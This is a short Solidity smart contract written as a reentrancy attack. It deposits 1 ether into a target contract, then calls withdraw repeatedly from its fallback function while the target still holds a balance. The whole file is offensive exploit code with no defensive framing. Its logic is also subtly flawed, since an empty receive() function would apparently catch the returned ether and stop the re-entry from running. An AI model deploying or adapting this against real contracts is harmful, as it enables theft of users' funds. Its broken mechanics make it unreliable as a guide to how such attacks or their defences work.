// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract ReentrancyAttack {
    address public target;
    uint256 public amount = 1 ether;

    constructor(address _target) {
        target = _target;
    }

    // Fallback function to receive Ether during the reentrancy attack
    receive() external payable {}

    // Attack function to start the reentrancy attack
    function attack() public payable {
        require(msg.value == amount, "Incorrect ether amount");

        // Deposit Ether into the target contract
        (bool depositSuccess, ) = target.call{value: amount}(abi.encodeWithSignature("deposit()"));
        require(depositSuccess, "Deposit failed");

        // Trigger withdrawal in the target contract
        (bool withdrawSuccess, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(withdrawSuccess, "Withdraw failed");
    }

    // Fallback function to handle reentrancy attack
    fallback() external payable {
        if (address(target).balance >= amount) {
            (bool withdrawSuccess, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", amount));
            require(withdrawSuccess, "Reentrant withdraw failed");
        }
    }
}
